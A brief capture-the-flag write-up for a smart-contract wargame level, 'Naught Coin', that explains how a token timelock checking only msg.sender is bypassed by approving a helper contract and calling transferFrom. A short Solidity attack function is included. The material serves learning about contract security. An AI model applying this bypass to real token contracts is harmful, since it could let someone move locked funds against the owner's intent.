### Level 15: Naught Coin

-   **Date:** 02-05-2026
-   **Difficulty:** Easy

#### Thinking

-   Since I was already familiar with some basic ERC20 functions, I knew that another contract or EOA can spend tokens on my behalf. The `lockTokens` modifier only restricts transfers when I am the `msg.sender`.
-   So I created an Attack contract, approved it to spend tokens on my behalf, and simply called `transferFrom`.

```
function performAttack(address _tokenAddress, uint256 _amount) external {
    INaughtCoin token = INaughtCoin(_tokenAddress);
    token.transferFrom(msg.sender, address(this), _amount);
}

```